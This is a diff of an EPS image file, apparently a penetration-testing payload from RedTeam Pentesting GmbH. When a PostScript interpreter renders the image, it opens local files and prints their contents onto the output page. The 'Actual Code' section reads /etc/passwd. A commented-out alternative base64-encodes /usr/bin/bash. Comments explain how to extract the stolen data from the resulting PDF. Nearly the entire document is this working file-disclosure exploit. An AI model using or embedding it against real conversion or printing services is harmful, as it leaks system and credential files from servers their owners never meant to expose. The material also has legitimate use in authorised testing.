@@ -1,17 +1,26 @@
 %!PS-Adobe-3.0 EPSF-3.0
 %%Pages: 1
-%%BoundingBox:   36   36  576  756
+%%BoundingBox:   0 0 1000 1000
 %%LanguageLevel: 1
 %%EndComments
 %%BeginProlog
 %%EndProlog
 
-%%%>>>Configurable variables<<<
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%                                      %
+%  RedTeam Pentesting GmbH             %
+%  kontakt@redteam-pentesting.de       %
+%  https://www.redteam-pentesting.de/  %
+%                                      %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%% Configurable Variables
 
 % how many chars per line
 /charactercount 100 def
 
-%%%page setup
+%%%%%%%%%%%%%%%%%%% Page Setup
+/xposinit 0 def
 
 % white page
 1 1 1 setrgbcolor clippath fill
@@ -21,7 +30,7 @@
 /pageheight currentpagedevice /PageSize get 1 get def
 
 % calculate the character width
-/characterWidth pagewidth charactercount div def
+/characterWidth pagewidth xposinit sub charactercount 2 add div def
 
 /Courier findfont setfont
 
@@ -32,24 +41,22 @@
 /lineheight characterWidth curWidth div def
 
 % initial x and y positions
-/xposinit 10 def
 /yposinit pageheight lineheight sub def
 
 /xpos xposinit def
 /ypos yposinit def
 xpos ypos moveto
 
+%%%%%%%%%%%%%%%%%%% Base64 Encoding Code
 
-
-%%% base64 encoding code
 /base64EncodingTable [
-        (A) (B) (C) (D) (E) (F) (G) (H) (I) (J)
-        (K) (L) (M) (N) (O) (P) (Q) (R) (S) (T)
-        (U) (V) (W) (X) (Y) (Z) (a) (b) (c) (d)
-        (e) (f) (g) (h) (i) (j) (k) (l) (m) (n)
-        (o) (p) (q) (r) (s) (t) (u) (v) (w) (x)
-        (y) (z) (0) (1) (2) (3) (4) (5) (6) (7)
-        (8) (9) (+) (/) (=)
+    (A) (B) (C) (D) (E) (F) (G) (H) (I) (J)
+    (K) (L) (M) (N) (O) (P) (Q) (R) (S) (T)
+    (U) (V) (W) (X) (Y) (Z) (a) (b) (c) (d)
+    (e) (f) (g) (h) (i) (j) (k) (l) (m) (n)
+    (o) (p) (q) (r) (s) (t) (u) (v) (w) (x)
+    (y) (z) (0) (1) (2) (3) (4) (5) (6) (7)
+    (8) (9) (+) (/) (=)
 ] def
 
 /base64DecodingTable [
@@ -63,257 +70,290 @@ xpos ypos moveto
     41 42 43 44 45 46 47 48 49 50 51 80 80 80 80 80 %/* 112 - 127 */
 ] def
 
-
 % takes 1-3 bytes and returns their 4 base64 encoded values (including padding)
+% inputBytes threeBytesToFourChars outBytes
 /threeBytesToFourChars {{
-        /inputBytes exch def
-        /b1 inputBytes 0 get def
+    /inputBytes exch def
+    /b1 inputBytes 0 get def
 
-        % first 6 of b1
-        /c1 b1 2#11111100 and -2 bitshift def
+    % first 6 of b1
+    /c1 b1 2#11111100 and -2 bitshift def
 
-        % padding for one char
-        inputBytes length 1 eq {
-                /c2 b1 2#00000011 and 4 bitshift def
-                [c1 c2 64 64]
-                exit
-        } if
-
-        /b2 inputBytes 1 get def
-
-        % last 2 of b1, first 4 of b2
-        /c2
-                b1 2#00000011 and 4 bitshift  % last 2 of b1
-                b2 2#11110000 and -4 bitshift % first 4 of b2
-                xor
-        def
-
-        % padding for two chars
-        inputBytes length 2 eq {
-                /c3 b2 2#00001111 and 2 bitshift def
-                [c1 c2 c3 64]
-                exit
-        } if
-
-        /b3 inputBytes 2 get def
-
-        % last 4 of b2, first 2 of b3
-        /c3
-                b2 2#00001111 and 2 bitshift  % last 4 of b2
-                b3 2#11000000 and -6 bitshift % first 2 of b3
-                xor
-        def
-
-        % last 6 of b3
-        /c4 b3 2#00111111 and def
-        [c1 c2 c3 c4]
+    % padding for one char
+    inputBytes length 1 eq {
+        /c2 b1 2#00000011 and 4 bitshift def
+        [c1 c2 64 64]
         exit
+    } if
+
+    /b2 inputBytes 1 get def
+
+    % last 2 of b1, first 4 of b2
+    /c2
+        b1 2#00000011 and 4 bitshift  % last 2 of b1
+        b2 2#11110000 and -4 bitshift % first 4 of b2
+        xor
+    def
+
+    % padding for two chars
+    inputBytes length 2 eq {
+        /c3 b2 2#00001111 and 2 bitshift def
+        [c1 c2 c3 64]
+        exit
+    } if
+
+    /b3 inputBytes 2 get def
+
+    % last 4 of b2, first 2 of b3
+    /c3
+        b2 2#00001111 and 2 bitshift  % last 4 of b2
+        b3 2#11000000 and -6 bitshift % first 2 of b3
+        xor
+    def
+
+    % last 6 of b3
+    /c4 b3 2#00111111 and def
+    [c1 c2 c3 c4]
+    exit
 }loop} def
 
 % takes 4 base64-encoded chars and returns their 3 byte values
+% inputChars FourCharsToThreeBytes outputBytes
 /FourCharsToThreeBytes {
-        /inputChars exch def
-	/c1 base64DecodingTable inputChars 0 get get def
-	/c2 base64DecodingTable inputChars 1 get get def
-	/c3 base64DecodingTable inputChars 2 get get def
-	/c4 base64DecodingTable inputChars 3 get get def
+    /inputChars exch def
+    /c1 base64DecodingTable inputChars 0 get get def
+    /c2 base64DecodingTable inputChars 1 get get def
+    /c3 base64DecodingTable inputChars 2 get get def
+    /c4 base64DecodingTable inputChars 3 get get def
 
-	/b1 
-		c1 2#00111111 and 2 bitshift
-		c2 2#00110000 and -4 bitshift
-		xor
-	def
+    /b1
+        c1 2#00111111 and 2 bitshift
+        c2 2#00110000 and -4 bitshift
+        xor
+    def
 
-	/b2
-		c2 2#00001111 and 4 bitshift
-		c3 2#00111100 and -2 bitshift
-		xor
-	def
+    /b2
+        c2 2#00001111 and 4 bitshift
+        c3 2#00111100 and -2 bitshift
+        xor
+    def
 
-	/b3
-		c3 2#00000011 and 6 bitshift
-		c4 2#00111111 and
-		xor
-	def
+    /b3
+        c3 2#00000011 and 6 bitshift
+        c4 2#00111111 and
+        xor
+    def
 
-	b1 b2 b3
+    b1 b2 b3
 } def
 
-% (a) (b) -> (ab)
+% Concatenate two strings
 % https://stackoverflow.com/questions/12378904/postscript-concatenate-two-strings
+% (a) (b) -> (ab)
 /concat { exch dup length
-        2 index length add string
-        dup dup 4 2 roll copy length
-        4 -1 roll putinterval
+ 2 index length add string
+ dup dup 4 2 roll copy length
+ 4 -1 roll putinterval
 } bind def
 
+% Encodes the inputstring in Base64
+% inputString base64Encode base64OutputString
 /base64Encode {
-        /inputString exch def
-        /outputString () def
-        0 3 inputString length 1 sub {
-                /i exch def
+    /inputString exch def
+    /outputString () def
+    0 3 inputString length 1 sub {
+        /i exch def
 
-                % if string is not divisible by three, only take the remaining interval
-                inputString length i 3 add le {
-                        /interval [inputString i inputString length i sub getinterval {} forall] def
-                } {
-                        /interval [inputString i 3 getinterval {} forall] def
-                }ifelse
-                /curChars interval threeBytesToFourChars def
-                /curOut () def
-                curChars {
-                        /curChar exch def
-                        /curOut curOut base64EncodingTable curChar get concat def
-                } forall
-                /outputString outputString curOut concat def
-        } for
-        outputString
+        % if string is not divisible by three, only take the remaining interval
+        inputString length i 3 add le {
+            /interval [inputString i inputString length i sub getinterval {} forall] def
+        } {
+            /interval [inputString i 3 getinterval {} forall] def
+        }ifelse
+        /curChars interval threeBytesToFourChars def
+        /curOut () def
+        curChars {
+            /curChar exch def
+            /curOut curOut base64EncodingTable curChar get concat def
+        } forall
+        /outputString outputString curOut concat def
+    } for
+    outputString
 } def
 
+% Decodes a Base64-encoded String to bytes
+% base64InputString base64Decode byteArray
 /base64Decode {
-	/inputString exch def
-	[
-	0 4 inputString length 1 sub {
-		/i exch def
+    /inputString exch def
+    [
+    0 4 inputString length 1 sub {
+        /i exch def
 
-		[inputString i 4 getinterval {} forall] FourCharsToThreeBytes
-	} for
-	]
+        [inputString i 4 getinterval {} forall] FourCharsToThreeBytes
+    } for
+    ]
 } def
 
-% https://github.com/sheepdoll/fpcb/blob/master/k2e.ps
-/makestring { 
-	%verbose 2 gt {(<) print =$} if
-	dup length string       % new string of right size
-	dup /NullEncode filter      % make a file out of string
-	2 index                 % array to stack top
-    { 2 copy write pop }         % integers to string
-	forall
-    flushfile exch pop                   % clean up
-} bind def
+%%%%%%%%%%%%%%%%%%% Printing Code
 
-%%%printing code
-% function for changing lines and pages
+% Move to new line and go to next page if current page is full
+% lineheight newline -
 /newline {
-	/lineheight exch def
+    /lineheight exch def
 
-        % new page if we are at the bottom of the page
-        ypos lineheight lt {
-                showpage
-                /xpos xposinit def
-                /ypos yposinit def
-                xpos ypos moveto
-        } if
-
-	% decrease y position
-        ypos lineheight sub
-        /ypos exch def
-
-        % move cursor
+    % new page if we are at the bottom of the page
+    ypos lineheight lt {
+        showpage
+        /xpos xposinit def
+        /ypos yposinit def
         xpos ypos moveto
+    } if
+
+    % decrease y position
+    ypos lineheight sub
+    /ypos exch def
+
+    % move cursor
+    xpos ypos moveto
 } def
 
-% This base64 encodes the file and prints it on the page
-% use pdftotext out.pdf - | base64 -d > file.out
-% "base64 -d" could throw an error, as empty lines on the page get interpreted as newlines, but this can be ignored
+% Draws a triangle at the current position
+% Used for indicating a forced linebreak if the current line is too long
+% - drawtri -
+/drawtri {
+    /width 5 def
+    currentpoint
+    /curY exch def
+    /curX exch def
+    newpath
+    curX curY lineheight 2 div add moveto
+    curX width add curY lineheight 4 div add lineto
+    curX curY lineto
+    curX curY lineheight 2 div add lineto
+    closepath
+    fill
+    stroke
+    curX width add curY moveto
+} def
+
+% Base64 encodes the file and prints it on the page
+% use pdftotext out.pdf - | base64 -d -i > file.out
+% inputFileName PrintFileBase64 -
 /PrintFileBase64
 {
-	% buffer for reading (characters per line, is shorter as base64 inflates the characters and we have an offset of 10 from the left)
-	/buff charactercount 0.7 mul cvi string def
-        /infilename exch def
-        % open file
-        /infile infilename (r) file def
-        /xpos xposinit def
-        /ypos yposinit def
-        xpos ypos moveto
-        % loop
-	{
-                % read chars from file to the buffer
-                infile buff readstring
-                { % if chars remaining
-                        % write the chars to the doc
-                        buff base64Encode show
-                        lineheight newline
-                }{ % else
-                        buff base64Encode show
-                        % close file pointer
-                        infile closefile
-                        % exit the loop
-                        exit
-                } ifelse
-        } bind loop
+    % buffer for reading (characters per line, is shorter as base64 inflates the characters and we have an offset of 10 from the left)
+    /rawwidth charactercount 0.7 mul cvi xposinit characterWidth div cvi sub def
+    /width rawwidth rawwidth 3 mod sub def
+
+    /buff width string def
+    /infilename exch def
+    % open file
+    /infile infilename (r) file def
+    /xpos xposinit def
+    /ypos yposinit def
+    xposinit yposinit moveto
+    % loop
+    {
+        % read chars from file to the buffer
+        infile buff readstring
+        { % if chars remaining
+            % write the chars to the doc
+            base64Encode show
+            lineheight newline
+        }{ % else
+            base64Encode show
+            % close file pointer
+            infile closefile
+            % exit the loop
+            exit
+        } ifelse
+    } bind loop
 } def
 
-% This fails if zero bytes are in the file, but is useful for simple text files
-/PrintFileWithNewLines
+% inFileName PrintFileAsText -
+/PrintFileAsText
 {
-	/buff charactercount string def
-        /infilename exch def
-        % open file
-        /infile infilename (r) file def
-        /xpos xposinit def
-        /ypos yposinit def
-        xpos ypos moveto
-        % loop
-	{
-                % read chars from file to the buffer
-                infile buff readline
-                { % if chars remaining
-                        % write the chars to the doc
-                        buff cvs show
-                        lineheight newline
-                }{ % else
-                        buff cvs show
-                        % close file pointer
-                        infile closefile
-                        % exit the loop
-                        exit
-                } ifelse
-        } bind loop
+    /buff 4096 string def
+    /infilename exch def
+    % open file
+    /infile infilename (r) file def
+    /xpos xposinit def
+    /ypos yposinit def
+    xpos ypos moveto
+    /curLinePos 0 def
+    % loop
+    {
+        % read chars from file to the buffer
+        infile buff readstring
+        /endOfFile exch not def
+        /curBuf exch def
+        % for every newline in the current buffer
+        % print it
+        {
+            % when the buffer is empty, exit loop
+            curBuf length 0 le {
+                exit
+            } if
+            
+            % split current buffer into lines
+            curBuf (\n) search {
+                /curLine exch def
+                pop
+                /curBuf exch def
+            } {
+                pop
+                /curLine curBuf def
+                /curBuf () def
+            } ifelse
+
+            % print the current line taking the current position into account
+            /i 0 def
+            {
+                i curLine length eq {
+                    exit
+                } if
+                curLinePos charactercount ge {
+                    lineheight newline
+                    drawtri
+                    /curLinePos 1 def
+                } if
+                /remaining curLine length i sub def
+                /printCharsNum charactercount curLinePos sub remaining min def
+                /printChars curLine i printCharsNum getinterval def
+                /curLinePos curLinePos printChars length add def
+                /i i printCharsNum add def
+                printChars show
+            } loop
+
+            % if the current buffer is not empty, then there are still new lines, so make a newline
+            curBuf length 0 gt {
+                lineheight newline
+                /curLinePos 0 def
+            } if
+        } loop
+        
+        endOfFile {
+            % close file pointer
+            infile closefile
+            % exit the loop
+            exit
+        } if
+    } bind loop
 } def
 
-% this does not print newlines, but can print files with zero bytes, e.g. /proc/self/cmdline
-/PrintFileWithoutNewLines
-{
-	/buff charactercount string def
-        /infilename exch def
-        % open file
-        /infile infilename (r) file def
-        /xpos xposinit def
-        /ypos yposinit def
-        xpos ypos moveto
-        % loop
-	{
-                % read chars from file to the buffer
-                infile buff readstring
-                { % if chars remaining
-                        % write the chars to the doc
-                        buff cvs show
-                        lineheight newline
-                }{ % else
-                        buff cvs show
-                        % close file pointer
-                        infile closefile
-                        % exit the loop
-                        exit
-                } ifelse
-        } bind loop
-} def
 
-%%% actual code
+%%%%%%%%%%%%%%%%%%% Actual Code
 {
-	%(/proc/self/cmdline) PrintFileWithoutNewLines 
-	%(/etc/passwd) PrintFileWithNewLines
-	(/tmp/testdatei.odt) PrintFileBase64
+    %(/usr/bin/bash) PrintFileBase64
+    (/etc/passwd) PrintFileAsText
 } stopped {
-	% if an error occurs, the cause is printed
-	/errormessage {
-		$error /errorname get 50 string cvs
-	} def
-	(printing file failed : ) show
-	lineheight newline
-	errormessage show
+    % if an error occurs, the cause is printed
+    /errormessage {
+        $error /errorname get 50 string cvs
+    } def
+    (printing file failed : ) show
+    lineheight newline
+    errormessage show
 } { } ifelse % error catching frame
 
 showpage
-0 quit
